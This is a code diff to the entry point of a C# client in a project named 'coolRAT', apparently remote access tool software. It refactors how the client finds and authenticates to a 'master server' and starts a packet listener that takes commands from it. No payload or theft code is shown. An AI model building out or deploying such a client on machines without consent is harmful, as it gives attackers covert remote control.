@@ -14,42 +14,26 @@ namespace coolRAT.Slave
     {
         static void Main(string[] args)
         {
-            MasterServerInfo MasterServerInfo;
-            Client Me;
             MasterFinder.RunInit(new ConnectionSettings(8888));
             Console.WriteLine("-- Master Finder running");
-            while(true)
+            while (true)
             {
                 MasterServerInfo inf = MasterFinder.ConnectToMasterServer();
-                if (!inf.IsEmpty)
+                if (inf.HasValues)
                 {
-                    MasterServerInfo = inf;
-                    Me = inf.LocalClient;
+                    SlaveGlobalData.MasterServerInfo = inf;
+                    SlaveGlobalData.LocalClient = inf.LocalClient;
+                    SlaveGlobalData.MainListenerLoop = new PacketListenerLoop(inf.MainConnection, new Slave_PacketHandler(inf.MainConnection));
+                    Console.WriteLine("Authentication complete.");
+                    Console.WriteLine($"Assigned Id: {inf.LocalClient.UniqueId}");
+                    Task.Run(() => SlaveGlobalData.MainListenerLoop.Run());
+                    Console.WriteLine($"PacketHandler of type {SlaveGlobalData.MainListenerLoop.Handler.GetType().ToString()} has been assigned to the main connection");
                     break;
                 }
             }
-            while(true)
-            {
-                // Connect the ping service
-                TcpConnection conn = new TcpConnection();
-                conn.Connect(MasterServerInfo.RemoteServer.Address.ToString(), MasterServerInfo.RemoteServer.Port);
-                ConnectPipePacket connect_packet = new ConnectPipePacket(Me.UniqueId, PipeType.Ping);
-                conn.SendPacket(connect_packet);
-                string packet_raw = conn.ReadPacket();
-                PipeConnectedPacket connectedPacket = PipeConnectedPacket.Deserialize(packet_raw);
-                if (connectedPacket.Success)
-                {
-                    Console.WriteLine("Ping service pipe connected");
-                    Me.Pipes.PingPipe = conn;
-                }
-                else
-                {
-                    Console.WriteLine("Failed to connect to the main server");
-                    return;
-                }
-                Thread.Sleep(10000);
-            }
             
+
+
             Console.WriteLine("Connected to the master server!");
             Console.ReadLine();
         }
